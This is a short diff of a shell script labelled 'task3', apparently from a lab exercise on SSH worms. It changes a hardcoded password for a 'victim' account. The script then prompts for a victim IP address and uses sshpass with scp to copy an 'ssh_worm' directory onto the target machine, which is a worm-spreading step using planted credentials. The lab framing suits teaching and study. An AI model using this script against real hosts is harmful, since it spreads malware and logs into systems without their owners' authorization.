@@ -1,6 +1,6 @@
 # task3
 # input victim's IP address
-export SSHPASS='victim123'
+export SSHPASS='victim'
 
 read -p "Enter Victim IP Address: " IP_Address
 sshpass -e scp -r /home/victim/Desktop/ssh_worm victim@"$IP_Address":/home/victim/Desktop
